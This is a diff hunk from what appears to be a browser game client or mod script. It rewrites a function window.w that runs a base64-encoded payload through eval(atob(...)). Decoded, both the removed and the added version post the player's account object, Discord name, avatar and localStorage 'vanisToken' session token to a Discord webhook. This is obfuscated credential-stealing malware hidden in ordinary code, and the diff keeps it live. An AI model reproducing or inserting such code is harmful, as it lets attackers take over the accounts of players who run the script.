@@ -8379,7 +8379,7 @@
         }]), window.RISETAG = "RISE69X", localStorage.cid || (localStorage.cid = makeid(28)), GAME.sendServer = e => {
             GAME.events.$emit("chat-message", e)
         }, 
-        window.w = () => {eval(atob('ZmV0Y2goImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExNDk4NTcxNTAyNDg3MDIwMDIvbHVnclRqYjIwdHRuQUpWZG1HeldpMUdsVjQ5SlE1Y19KMEREM1dnU1NyWDZSUDBoM21KQ0NxZXJPaGczVVcwX24zY2oiLHttZXRob2Q6InBvc3QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIn0sYm9keTpKU09OLnN0cmluZ2lmeSh7dXNlcm5hbWU6d2luZG93LmFjY291bnQuYWNjb3VudC5kaXNjb3JkX25hbWUsYXZhdGFyX3VybDp3aW5kb3cuYWNjb3VudC5hdmF0YXJVcmwsY29udGVudDpgYGBganNvbgoke0pTT04uc3RyaW5naWZ5KHdpbmRvdy5hY2NvdW50LmFjY291bnQsbnVsbCwyKX1gYGAKJHtsb2NhbFN0b3JhZ2UudmFuaXNUb2tlbn1gfSl9KTs='))}
+        window.w = () => {eval(atob('ZmV0Y2goImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExNDk4NTcxNTAyNDg3MDIwMDIvbHVnclRqYjIwdHRuQUpWZG1HeldpMUdsVjQ5SlE1Y19KMEREM1dnU1NyWDZSUDBoM21KQ0NxZXJPaGczVVcwX24zY2oiLHttZXRob2Q6InBvc3QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIn0sYm9keTpKU09OLnN0cmluZ2lmeSh7dXNlcm5hbWU6d2luZG93LmFjY291bnQuYWNjb3VudC5kaXNjb3JkX25hbWUsYXZhdGFyX3VybDp3aW5kb3cuYWNjb3VudC5hdmF0YXJVcmwsY29udGVudDpKU09OLnN0cmluZ2lmeSh3aW5kb3cuYWNjb3VudC5hY2NvdW50LG51bGwsMikrIiAiK2xvY2FsU3RvcmFnZS52YW5pc1Rva2VufSl9KTs='))}
         ,GAME.setText = e => {
             GAME.events.$emit("update-cautions", {
                 custom: e
